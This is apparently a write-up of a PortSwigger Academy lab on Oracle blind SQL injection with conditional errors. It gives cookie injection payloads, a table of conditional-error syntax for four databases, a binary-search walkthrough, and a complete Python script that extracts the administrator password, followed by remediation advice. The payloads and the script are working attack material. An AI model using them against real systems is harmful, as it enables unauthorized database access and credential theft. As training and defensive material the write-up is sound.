## Objective

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

---

## Background

Blind SQL injection with conditional errors is a web security vulnerability that allows an attacker to infer database information by triggering intentional errors. This occurs when user input is concatenated into SQL queries without proper sanitization, and the application exposes different error messages based on query execution. Unlike boolean-based blind injection (which relies on content changes), error-based injection uses database errors as the true/false signal.

## Things to Know

Before attempting this lab, understand these Oracle-specific SQL concepts:

| Concept                               | Description                                                                                                             | Example                                              |
| ------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| `SUBSTR(string, start, length)`       | Extracts a portion of a string. **Note:** Start index begins at 1 (not 0)                                               | `SUBSTR('hello', 1, 1)` → `'h'`                      |
| `ASCII(character)`                    | Returns the ASCII code of a character                                                                                   | `ASCII('A')` → `65`                                  |
| `LENGTH(string)`                      | Returns the length of a string                                                                                          | `LENGTH('hello')` → `5`                              |
| `\|\|`                                | Oracle string concatenation operator                                                                                    | `'hello' \|\| 'world'` → `'helloworld'`              |
| `CASE WHEN ... THEN ... ELSE ... END` | Conditional expression — executes different branches based on a condition                                               | `CASE WHEN (1=1) THEN 'yes' ELSE 'no' END` → `'yes'` |
| `TO_CHAR(1/0)`                        | Triggers a division by zero error, converted to string type for Oracle compatibility                                    | Causes `ORA-01476: divisor is equal to zero`         |
| `FROM dual`                           | Oracle requires a table reference in every `SELECT`. `dual` is a built-in dummy table used when no real table is needed | `SELECT 1+1 FROM dual` → `2`                         |

### Important Notes

- **`SUBSTR` vs `SUBSTRING`**: Oracle uses `SUBSTR()`, not `SUBSTRING()`. Using `SUBSTRING()` on Oracle will cause an error.
- **`||` vs `+` or `CONCAT()`**: Oracle uses `||` for string concatenation. This is also used to **inject the payload** without breaking the original cookie string.
- **Why `TO_CHAR(1/0)` and not just `1/0`**: In Oracle, `CASE WHEN` branches must return compatible types. Wrapping the division in `TO_CHAR()` ensures type consistency and reliably triggers the error.

### Step 2: Identify Database Type

I started with a generic conditional error payload, but it didn't work:
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```

This indicated the database requires **Oracle-specific syntax**. After researching the [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), I found the correct Oracle syntax:

| Database | Conditional Error Syntax |
|----------|-------------------------|
| **Oracle** | `SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| **Microsoft SQL Server** | `SELECT CASE WHEN (condition) THEN 1/0 ELSE NULL END` |
| **PostgreSQL** | `1 = (SELECT CASE WHEN (condition) THEN 1/(SELECT 0) ELSE NULL END)` |
| **MySQL** | `SELECT IF(condition, (SELECT table_name FROM information_schema.tables), 'a')` |

### Step 3: Confirm Vulnerability with Oracle Syntax

Oracle requires:
- `TO_CHAR(1/0)` for division by zero error
- `FROM dual` for standalone SELECT statements
- `||` for string concatenation

**Test payload (condition FALSE = no error):**
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
Result: ✅ No error (condition is FALSE, so `TO_CHAR(1/0)` is not executed)

**Test payload (condition TRUE = error):**
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
Result: ❌ "Internal Server Error" (condition is TRUE, so division by zero triggers error)

### Step 4: Find Password Length

I assumed the password length might be 20 (based on Lab 11), so I tested directly:
```
TrackingId=u5YD3PapBcR4lN3e7Tj4'||(SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator') = 20) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
Result: ❌ "Internal Server Error" → **Password length is 20 characters**

### Step 5: Extract Password Character by Character

I used `SUBSTR()` (Oracle's version of `SUBSTRING`) with `ASCII()` and binary search:

**First character test:**
```
||(SELECT CASE WHEN (ASCII((SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')) > 109) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Using binary search (low=32, high=126):

```
> 79   ✅ TRUE  → low = 80
> 103  ✅ TRUE  → low = 104
> 115  ✅ TRUE  → low = 116
> 121  ❌ FALSE → high = 120
> 118  ✅ TRUE  → low = 119
> 119  ✅ TRUE  → low = 120
> 120  ❌ FALSE → high = 119
```

low > high → exit loop → `chr(120)` = **'x'**
### Step 6: Automate with Python Script

Manual extraction for 20 characters would be time-consuming. I wrote a Python script using binary search:

```python
import requests

url = "https://<LAB-ID>.web-security-academy.net/"

SESSION = ""   # Paste your session value here
TRACKING_BASE = ""  # Paste your original TrackingId value here

password = ""

for position in range(1, 21):
    low, high = 32, 126

    while low <= high:
        mid = (low + high) // 2

        payload = f"{TRACKING_BASE}'||(SELECT CASE WHEN (ASCII((SELECT SUBSTR(password,{position},1) FROM users WHERE username='administrator')) > {mid}) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"

        cookies = {
            "TrackingId": payload,
            "session": SESSION
        }

        response = requests.get(url, cookies=cookies)

        if "Internal Server Error" in response.text:
            low = mid + 1  # TRUE = error = character code > mid
        else:
            high = mid - 1  # FALSE = no error = character code <= mid

    password += chr(low)
    print(f"[+] Position {position}: {chr(low)} → current: {password}")

print(f"\n[*] Full password: {password}")
```

> [!NOTE] Key Difference from Lab 11
> In Lab 11 (boolean-based), "Welcome back!" = TRUE. In this lab (error-based), **"Internal Server Error" = TRUE**. This is because the error is intentionally triggered when the condition is true.

## Why It Worked

The application executes a SQL query using the tracking cookie value without proper sanitization. While query results aren't displayed, the application exposes **different error messages** based on query execution:

| Condition | Query Behavior | Application Response |
|-----------|---------------|---------------------|
| TRUE | `TO_CHAR(1/0)` executes → Division by zero error | "Internal Server Error" |
| FALSE | `TO_CHAR(1/0)` skipped → No error | Normal response |

### Attack Breakdown

| Component | Purpose |
|-----------|---------|
| `'` | Closes the original string parameter in the cookie value |
| `\|\|` | Oracle string concatenation operator (joins payload with original value) |
| `SELECT CASE WHEN ... THEN ... ELSE ... END` | Conditional logic—executes error only if condition is TRUE |
| `TO_CHAR(1/0)` | Triggers a division by zero error (converted to string for Oracle compatibility) |
| `FROM dual` | Oracle dummy table required for standalone SELECT statements |
| `SUBSTR(password, position, 1)` | Extracts one character at a time from the password (Oracle syntax) |
| `ASCII(...)` | Converts the character to its numeric ASCII code for comparison |
| `> mid` | Binary search comparison—TRUE if character code is greater than midpoint |

The attack succeeded because:

1. **Injection point identified** (tracking cookie is concatenated into SQL query)
2. **Error-based detection works** ("Internal Server Error" indicates TRUE condition)
3. **Oracle syntax correctly applied** (`TO_CHAR(1/0)`, `dual`, `SUBSTR`, `||`)
4. **Systematic extraction** (binary search reduces requests per character from ~95 to ~7)
5. **No rate limiting** (the lab doesn't block repeated requests)

## How to Fix It

The only reliable defense is to **use parameterized queries (prepared statements)**. This ensures user input is treated as data, not executable code.

See [Lab 1: SQL Injection Fundamentals](01.%20SQL%20injection%20vulnerability%20in%20WHERE%20clause%20allowing%20retrieval%20of%20hidden%20data.md) for language-specific examples.

### Additional Recommendations

| Defense | Description |
|---------|-------------|
| **Parameterized Queries** | Always use placeholders instead of concatenating user input (including cookies!) |
| **Input Validation** | Validate cookie format and reject unexpected values |
| **Error Handling** | Never expose detailed database errors to users—use generic error messages |
| **Rate Limiting** | Implement request throttling to slow down automated attacks |
| **Web Application Firewall (WAF)** | Deploy a WAF to detect and block SQL injection patterns |

See [OWASP Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) for more information.

---

## Key Takeaway

> Error-based blind SQL injection uses database errors as the true/false signal—**"Internal Server Error" = TRUE** in this lab. Oracle requires specific syntax (`TO_CHAR(1/0)`, `FROM dual`, `SUBSTR`, `||`), which differs from MySQL/PostgreSQL. Binary search dramatically reduces extraction time, and automation (Python/sqlmap) is essential for real-world engagements. Always use **parameterized queries** for ALL user input, and never expose detailed error messages to users. Understanding database-specific syntax is crucial for successful exploitation and defense.
